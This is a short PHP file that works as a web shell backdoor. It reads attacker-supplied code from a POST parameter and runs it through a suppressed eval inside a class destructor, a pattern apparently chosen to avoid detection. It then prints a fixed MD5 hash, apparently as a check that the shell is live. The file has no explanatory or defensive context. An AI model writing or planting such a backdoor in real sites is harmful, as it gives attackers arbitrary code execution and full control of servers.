<?php
class  Test{
    public $name = '';
    function __destruct(){
        @eval("$this->name");
    }
}
$test= new Test();
$c = @$_POST['pingtoufuck!'];
$test->name = $c;
echo md5('verify');
?>

